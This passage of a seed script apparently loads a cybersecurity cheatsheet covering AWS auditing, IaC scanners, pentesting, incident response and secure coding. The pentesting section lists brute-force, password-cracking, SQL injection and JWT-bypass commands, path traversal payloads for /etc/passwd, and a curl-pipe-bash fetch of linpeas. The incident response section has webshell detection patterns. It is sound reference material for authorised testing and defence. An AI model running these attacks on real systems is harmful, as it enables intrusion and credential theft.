aws iam delete-access-key --user-name alice --access-key-id OLD_KEY`,
                },
                {
                  order: 1,
                  language: "bash",
                  label: "Security groups, CloudTrail & GuardDuty",
                  content: `# ── Security Group Audit ──────────────────────────────────────────────────
# Find security groups with 0.0.0.0/0 ingress (world-accessible)
aws ec2 describe-security-groups \
  --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]].{ID:GroupId,Name:GroupName}"

# Find SGs with port 22 (SSH) open to the world — critical
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.from-port,Values=22" \
            "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query "SecurityGroups[*].[GroupId,GroupName]"

# Find SGs with port 3389 (RDP) open to the world
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.from-port,Values=3389" \
            "Name=ip-permission.cidr,Values=0.0.0.0/0"

# ── S3 Bucket Security ─────────────────────────────────────────────────────
# Check public access block (should be enabled)
aws s3api get-public-access-block --bucket my-bucket

# Enable public access block
aws s3api put-public-access-block --bucket my-bucket \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Check bucket ACL
aws s3api get-bucket-acl --bucket my-bucket

# Enable versioning (ransomware protection)
aws s3api put-bucket-versioning --bucket my-bucket \
  --versioning-configuration Status=Enabled

# Enable encryption
aws s3api put-bucket-encryption --bucket my-bucket \
  --server-side-encryption-configuration \
  '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'

# ── CloudTrail (API audit logging) ─────────────────────────────────────────
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name my-trail

# Query CloudTrail with Athena or:
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --max-results 20

# ── GuardDuty (threat detection) ───────────────────────────────────────────
# Enable GuardDuty
aws guardduty create-detector --enable

# List findings
aws guardduty list-findings --detector-id <id>
aws guardduty get-findings --detector-id <id> --finding-ids <id>

# ── AWS Config (compliance) ────────────────────────────────────────────────
# Check non-compliant resources
aws configservice describe-compliance-by-resource \
  --compliance-types NON_COMPLIANT`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "IaC security scanning",
                  content: `# ── Checkov — Terraform / CloudFormation / K8s ─────────────────────────────
pip install checkov

checkov -d .                           # scan all IaC in directory
checkov -f main.tf                     # single file
checkov --framework terraform
checkov --framework cloudformation
checkov --framework kubernetes
checkov --framework dockerfile
checkov --check CKV_AWS_21            # specific check (S3 versioning)
checkov --skip-check CKV_AWS_3       # suppress false positive

# ── tfsec — Terraform ─────────────────────────────────────────────────────
brew install tfsec
tfsec .
tfsec . --format json | jq '.[].description'
tfsec --minimum-severity HIGH .

# ── trivy — container images + IaC ────────────────────────────────────────
trivy image nginx:latest               # scan Docker image
trivy image --severity HIGH,CRITICAL myapp:1.0
trivy fs .                             # scan filesystem
trivy config .                         # scan IaC misconfigs
trivy k8s --report summary cluster     # scan live K8s cluster

# ── prowler — AWS CIS benchmark ───────────────────────────────────────────
pip install prowler
prowler aws                            # full AWS audit
prowler aws --checks s3_bucket_public_access
prowler aws --compliance cis_1.4_aws

# ── Grype — vulnerability scanner ─────────────────────────────────────────
grype myapp:latest
grype . --scope all-layers
grype sbom:./sbom.json                # scan from SBOM

# ── Generate SBOM ─────────────────────────────────────────────────────────
syft myapp:latest -o spdx-json > sbom.json
syft dir:. -o cyclonedx-json > sbom.json`,
                },
              ],
            },
          },
          // ── Pentesting Tools ──────────────────────────────────────────────────
          {
            title: "Pentesting Tools & Techniques",
            description: "Reconnaissance, exploitation, and post-exploitation tools for authorised testing",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "bash",
                  label: "Reconnaissance & enumeration",
                  content: `# ── OSINT / Passive Recon ─────────────────────────────────────────────────
# DNS enumeration
dig any example.com
dnsx -d example.com -a -mx -ns -txt     # dnsx tool

# Subdomain enumeration
subfinder -d example.com
amass enum -d example.com
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt

# Google dorks (passive)
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com "DB_PASSWORD" OR "api_key"
"@example.com" filetype:xls

# Find tech stack
whatweb https://example.com
wappalyzer (browser extension)

# Certificate transparency logs
curl "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value'

# ── Active Recon ───────────────────────────────────────────────────────────
# Web directory / file discovery
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,302,403
feroxbuster -u https://example.com

# Virtual host discovery
ffuf -u https://10.10.10.1 -H "Host: FUZZ.example.com" -w subdomains.txt -mc 200

# Parameter discovery
arjun -u https://example.com/api -m GET

# ── Web Vulnerability Scanning ─────────────────────────────────────────────
# Nikto — web server scanner
nikto -h https://example.com

# OWASP ZAP — automated scan (proxy mode or CLI)
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" \
  https://example.com

# SQLMap — SQL injection testing
sqlmap -u "https://example.com/item?id=1" --dbs
sqlmap -u "https://example.com/login" --data "user=admin&pass=test" --dbs
sqlmap -r request.txt --level=5 --risk=3   # from Burp request file

# ── Password Attacks ───────────────────────────────────────────────────────
# Hashcat — offline password cracking
hashcat -m 0    hashes.txt wordlist.txt            # MD5
hashcat -m 100  hashes.txt wordlist.txt            # SHA1
hashcat -m 1800 hashes.txt wordlist.txt            # SHA-512crypt
hashcat -m 3200 hashes.txt wordlist.txt            # bcrypt
hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule  # with rules
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d?d     # mask attack

# Hydra — online brute force (authorised targets only)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1
hydra -l admin -P passwords.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid password"`,
                },
                {
                  order: 1,
                  language: "bash",
                  label: "Burp Suite & web testing",
                  content: `# ── Burp Suite Proxy setup ────────────────────────────────────────────────
# 1. Start Burp → Proxy → Options → listen on 127.0.0.1:8080
# 2. Configure browser to use proxy 127.0.0.1:8080
# 3. Import Burp CA cert into browser:
#    Navigate to http://burpsuite → Download CA Certificate → Import in browser
# 4. Enable Intercept to capture requests

# ── Burp Suite via curl ────────────────────────────────────────────────────
# Route curl through Burp proxy
curl -x http://127.0.0.1:8080 -k https://target.example.com/api/user

# Save a request from Burp → right-click → Save item → use with sqlmap
sqlmap -r burp_request.txt --batch

# ── Common Manual Tests ────────────────────────────────────────────────────
# IDOR — change numeric ID in request
GET /api/orders/1001 → try /api/orders/1002 (different user's order?)

# Mass assignment — add unexpected fields to POST body
POST /api/users  {"name":"alice","email":"a@b.com","role":"admin"}

# HTTP verb tampering
# If GET /admin is blocked, try POST /admin or HEAD /admin

# CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://api.example.com/users
# Look for: Access-Control-Allow-Origin: https://evil.com

# Host header injection
curl -H "Host: evil.com" https://example.com/reset-password

# Path traversal
GET /download?file=../../../../etc/passwd
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd  (URL encoded)

# Open redirect
GET /redirect?url=https://evil.com

# ── JWT Testing ────────────────────────────────────────────────────────────
# Decode JWT (no verification)
echo "eyJhbGci..." | base64 -d 2>/dev/null
# or: jwt.io

# Test alg:none bypass (use Burp Repeater)
# 1. Decode JWT, change "alg":"HS256" to "alg":"none"
# 2. Modify payload (e.g. "role":"admin")
# 3. Remove signature (keep trailing dot): header.payload.
# 4. Send — if server accepts, alg:none is vulnerable

# Crack HS256 JWT secret
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "Post-exploitation & privilege escalation",
                  content: `# ── Linux Privilege Escalation Checklist ──────────────────────────────────
# Automated enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
# OR: download linpeas.sh, transfer to target, chmod +x, run

# Manual checks

# Current user and groups
id
whoami
groups

# Sudo permissions (no password needed?)
sudo -l

# SUID / SGID binaries (run as owner/group)
find / -perm -u=s -type f 2>/dev/null    # SUID
find / -perm -g=s -type f 2>/dev/null    # SGID
# Check GTFOBins for exploitation: https://gtfobins.github.io/

# Writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {}

# Cron jobs (can we hijack a script?)
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# World-writable files and directories
find / -perm -o+w -not -type l 2>/dev/null | grep -v /proc | grep -v /sys

# Capabilities (alternative to SUID)
getcap -r / 2>/dev/null

# NFS shares (root squashing disabled?)
cat /etc/exports

# Kernel exploits (check version)
uname -a
searchsploit linux kernel $(uname -r | cut -d- -f1)

# Readable sensitive files
cat /etc/passwd
cat /etc/shadow     # requires root
find / -name "*.bak" -o -name "*.conf" -o -name "*.config" 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null

# Running services and processes
ps auxf
ss -tlnp
cat /etc/hosts`,
                },
              ],
            },
          },
          // ── Incident Response ─────────────────────────────────────────────────
          {
            title: "Incident Response",
            description: "Detection, containment, eradication, recovery, and forensics commands",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "markdown",
                  label: "IR phases & playbook",
                  content: `# Incident Response Lifecycle (NIST SP 800-61)

## 1. Preparation
- Documented IR plan and communication tree
- SIEM, IDS/IPS, EDR deployed and alerting
- Asset inventory current and tagged by criticality
- Backups tested and stored offline
- Tabletop exercises run quarterly

## 2. Detection & Analysis
- Alert from SIEM / GuardDuty / EDR / user report
- Determine scope: affected systems, accounts, data
- Assign severity:
  P1 Critical — active breach, data exfiltration
  P2 High     — ransomware, compromised privileged account
  P3 Medium   — phishing, malware on one endpoint
  P4 Low      — policy violation, failed login spike
- Preserve evidence: take memory dumps, log snapshots before touching anything
- Document timeline in real time (incident log)

## 3. Containment
Short-term: isolate affected system (network quarantine), disable account
Long-term:  patch root cause, tighten firewall, reset credentials

## 4. Eradication
- Remove malware, backdoors, web shells
- Identify and close the initial attack vector
- Patch vulnerability that was exploited
- Remove attacker persistence mechanisms (cron jobs, startup scripts, SSH keys)
- Audit all privileged accounts — rotate all secrets

## 5. Recovery
- Restore from known-good backups
- Monitor closely for re-infection for 30 days
- Gradually restore services (critical first)
- Confirm system integrity before returning to production

## 6. Post-Incident Activity
- Write incident report (timeline, root cause, impact, remediation)
- Update runbooks and detection rules
- Share TTPs (MITRE ATT&CK mapping) with SOC
- Update threat model with new attack vector`,
                },
                {
                  order: 1,
                  language: "bash",
                  label: "Live forensics & triage commands",
                  content: `# ── Volatile Data (capture FIRST — lost on reboot) ────────────────────────
# Current date/time (establish timeline baseline)
date; uptime

# Logged-in users
who
w
last -n 50
lastb -n 20                    # failed logins

# Running processes
ps auxf
ps -eo pid,ppid,user,cmd --sort=pid

# Open network connections
ss -antp                       # all TCP connections with process
ss -anup                       # UDP
netstat -antp                  # alternative

# Open files per process (detect C2 / data exfil)
lsof -i                        # all network-connected processes
lsof -i tcp:80 -i tcp:443      # HTTP/HTTPS only
lsof -u www-data               # files opened by www-data user

# Scheduled jobs (check for persistence)
crontab -l
crontab -l -u root
ls -la /etc/cron*
systemctl list-timers

# ── Process Investigation ──────────────────────────────────────────────────
# Find process with unusual parent (e.g. webshell spawning bash)
ps auxf | grep -A5 -B5 apache

# Inspect process memory maps
cat /proc/<PID>/maps
cat /proc/<PID>/cmdline | tr '\\0' ' '
ls -la /proc/<PID>/exe           # what binary is running

# List environment variables of a process
cat /proc/<PID>/environ | tr '\\0' '\\n'

# ── File System Investigation ──────────────────────────────────────────────
# Recently modified files (last 24 hours)
find /var/www /tmp /dev/shm -mtime -1 -type f 2>/dev/null
find / -mtime -1 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Suspicious locations (common malware drops)
ls -la /tmp /dev/shm /var/tmp /run
ls -la /etc/cron.d /etc/cron.daily

# Check for webshells
grep -rn "eval\|base64_decode\|system\|passthru\|exec\|shell_exec" /var/www/ --include="*.php"
find /var/www -name "*.php" -mtime -7 -exec ls -la {} \;

# ── Log Analysis ───────────────────────────────────────────────────────────
# Auth log — login attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
grep "Accepted password" /var/log/auth.log
grep "sudo" /var/log/auth.log

# Web access log — suspicious requests
grep "'" /var/log/nginx/access.log                    # SQL injection
grep "<script" /var/log/nginx/access.log              # XSS
grep "\.\./\.\." /var/log/nginx/access.log            # path traversal
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # top IPs

# ── Preserve Evidence ──────────────────────────────────────────────────────
# Memory dump (requires LiME kernel module or crash dump)
# Disk image (do this from a live OS, not the compromised one)
dd if=/dev/sda bs=4M | gzip > /mnt/external/disk_image.gz

# Hash everything before analysis
sha256sum /dev/sda > /mnt/external/disk.sha256
sha256sum suspicious_file.php > hash.txt`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "Malware analysis & IOC hunting",
                  content: `# ── Static Analysis ───────────────────────────────────────────────────────
# File identification
file malware.bin
xxd malware.bin | head -4           # hex dump header
strings malware.bin | grep -E "http|cmd|exec|powershell"

# Hash for VirusTotal lookup
md5sum    malware.bin
sha256sum malware.bin
# Submit to: virustotal.com / hybrid-analysis.com

# PE analysis (Windows executables)
exiftool malware.exe
pecheck malware.exe

# YARA rules — pattern matching
yara -r /usr/share/yara/rules/ /var/www/html/
# Community rules: github.com/Yara-Rules/rules

# ── IOC Hunting ───────────────────────────────────────────────────────────
# Known malicious IP connections
ss -antp | grep -E "ESTABLISHED|SYN_SENT"
# Cross-reference IPs with threat intel:
# abuseipdb.com, shodan.io, virustotal.com

# DNS queries to malicious domains (from logs)
grep -i "evil-domain.com" /var/log/syslog
cat /var/log/named/query.log | grep "evil-domain"

# Check /etc/hosts for hijacking
cat /etc/hosts
# Any unusual entries mapping known-good domains to different IPs?

# ── MITRE ATT&CK Mapping ───────────────────────────────────────────────────
# Map observed behaviours to ATT&CK techniques
# T1059 — Command and Scripting Interpreter (shell spawned from web process)
# T1053 — Scheduled Task/Job (malicious cron job)
# T1078 — Valid Accounts (compromised credentials used)
# T1071 — Application Layer Protocol (C2 over HTTP/DNS)
# T1048 — Exfiltration Over Alternative Protocol (data over DNS)
# T1136 — Create Account (attacker added backdoor user)

# ── Containment actions ────────────────────────────────────────────────────
# Block malicious IP at firewall
iptables -I INPUT  -s <malicious-ip> -j DROP
iptables -I OUTPUT -d <malicious-ip> -j DROP

# Isolate host: remove from load balancer, revoke DNS
# AWS: modify security group to deny all inbound
aws ec2 modify-instance-attribute --instance-id i-xxx \
  --groups sg-isolated   # SG with no inbound rules

# Kill malicious process
kill -9 <PID>
# But preserve the process first:
# cat /proc/<PID>/maps > /tmp/process_maps.txt
# cp /proc/<PID>/exe /tmp/malware_copy`,
                },
              ],
            },
          },
          // ── Secure Coding ─────────────────────────────────────────────────────
          {
            title: "Secure Coding Fundamentals",
            description: "Input validation, output encoding, secure headers, and defence-in-depth principles",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "typescript",
                  label: "Input validation patterns",
                  content: `import { z } from "zod";

// ── Schema Validation with Zod ─────────────────────────────────────────────
const CreateUserSchema = z.object({
  email:    z.string().email().max(254),
  username: z.string().min(3).max(30).regex(/^[a-zA-Z0-9_-]+$/),
  age:      z.number().int().min(18).max(120),
  role:     z.enum(["user", "moderator"]),   // whitelist; never accept "admin" from client
  bio:      z.string().max(500).optional(),
});

// ✅ Parse at system boundary (controller/handler) — reject early
app.post("/users", async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({
      error: "Validation failed",
      issues: result.error.issues,   // safe to return schema errors
    });
  }
  const data = result.data;           // type-safe, validated
  // ... proceed
});

// ── Path Traversal Prevention ──────────────────────────────────────────────
import path from "path";

const UPLOAD_DIR = "/var/uploads";

function safeFilePath(filename: string): string {
  // Normalise and verify the path stays within UPLOAD_DIR
  const resolved = path.resolve(UPLOAD_DIR, filename);
  if (!resolved.startsWith(UPLOAD_DIR + path.sep)) {
    throw new Error("Path traversal detected");
  }
  return resolved;
}

// ❌ VULNERABLE
app.get("/file", (req, res) => res.sendFile(req.query.name as string));

// ✅ SECURE
app.get("/file", (req, res) => {
  const filePath = safeFilePath(path.basename(req.query.name as string));
  res.sendFile(filePath);
});

// ── Mass Assignment Prevention ─────────────────────────────────────────────
// ❌ VULNERABLE — trusts all client fields
async function updateUser(id: string, body: unknown) {
  await db.users.update({ where: { id }, data: body as any });
}

// ✅ SECURE — explicit allowlist of updatable fields
async function updateUser(id: string, body: unknown) {
  const UpdateSchema = z.object({
    bio:    z.string().max(500).optional(),
    avatar: z.string().url().optional(),
    // role, isAdmin, subscription — NOT included
  });
  const data = UpdateSchema.parse(body);
  await db.users.update({ where: { id }, data });
}`,
                },
                {
                  order: 1,
                  language: "typescript",
                  label: "Security headers & CSP",
                  content: `import helmet from "helmet";
import express from "express";

const app = express();

// ── helmet — sets sensible security headers automatically ──────────────────
app.use(helmet());

// ── Fine-grained Content Security Policy ──────────────────────────────────
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", "https://cdn.example.com"],
      styleSrc:   ["'self'", "https://fonts.googleapis.com"],
      fontSrc:    ["'self'", "https://fonts.gstatic.com"],
      imgSrc:     ["'self'", "data:", "https://cdn.example.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      objectSrc:  ["'none'"],
      frameAncestors: ["'none'"],          // clickjacking prevention
      upgradeInsecureRequests: [],
    },
  }),
);

// ── Individual headers (what helmet sets) ─────────────────────────────────
app.use(helmet.hsts({                      // HTTPS only
  maxAge: 63072000,                        // 2 years
  includeSubDomains: true,
  preload: true,
}));
app.use(helmet.noSniff());                 // X-Content-Type-Options: nosniff
app.use(helmet.frameguard({ action: "deny" })); // X-Frame-Options: DENY
app.use(helmet.xssFilter());               // X-XSS-Protection: 1; mode=block
app.use(helmet.referrerPolicy({ policy: "strict-origin-when-cross-origin" }));
app.use(helmet.permittedCrossDomainPolicies());

// ── CORS — explicit origin allowlist ──────────────────────────────────────
import cors from "cors";

const allowedOrigins = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  methods:     ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
  maxAge:      86400,    // cache preflight 24h
}));`,
                },
                {
                  order: 2,
                  language: "markdown",
                  label: "Secure coding checklist",
                  content: `# Secure Coding Checklist

## Input
- [ ] Validate all inputs at trust boundaries (type, length, format, range)
- [ ] Whitelist allowed characters; reject or sanitise unexpected input
- [ ] Reject null bytes, Unicode tricks, overly long strings
- [ ] Validate file uploads: extension, MIME type, max size, scan content
- [ ] Never trust client-supplied roles, prices, IDs, or flags

## Output
- [ ] Context-aware output encoding (HTML, JS, URL, CSS, SQL)
- [ ] Use templating engines that auto-escape (React, Jinja2 with autoescaping)
- [ ] Sanitise rich HTML with DOMPurify when needed
- [ ] Never return raw DB errors or stack traces to clients

## Authentication
- [ ] Enforce MFA for privileged accounts
- [ ] Rate-limit login, registration, OTP, password-reset endpoints
- [ ] Hash passwords with Argon2id / bcrypt (cost ≥ 12)
- [ ] Rotate session ID on privilege change (login/sudo)
- [ ] Invalidate sessions server-side on logout
- [ ] Set cookie flags: HttpOnly, Secure, SameSite=Strict

## Authorisation
- [ ] Deny by default — require explicit grants
- [ ] Re-check permissions on every resource access (not just lists)
- [ ] Verify resource ownership (IDOR prevention)
- [ ] Log all access-control failures

## Data Protection
- [ ] Encrypt sensitive data at rest (AES-256-GCM)
- [ ] Use TLS 1.2+ everywhere; enforce HSTS
- [ ] Never log secrets, tokens, passwords, PAN, SSN
- [ ] Apply data minimisation — don't store what you don't need

## Dependencies & Build
- [ ] Pin dependency versions (lock files)
- [ ] Run dependency vulnerability scans in CI (npm audit, pip-audit, Trivy)
- [ ] Scan IaC for misconfigurations (Checkov, tfsec)
- [ ] Sign build artifacts and verify signatures on deploy

## Infrastructure
- [ ] Principle of least privilege for all IAM/RBAC roles
- [ ] No default credentials anywhere
- [ ] Security headers on every HTTP response
- [ ] Restrict CORS to explicit origin allowlist
- [ ] Block all ports not required by the application`,
                },
              ],
            },
          },
        ],
      },
    },
  });

  console.log(`✅ Created Cybersecurity cheatsheet: ${cybersecurity.name} (${cybersecurity.id})`);
}

main()
  .catch((e) => { console.error(e); process.exit(1); })
  .finally(() => prisma.$disconnect());
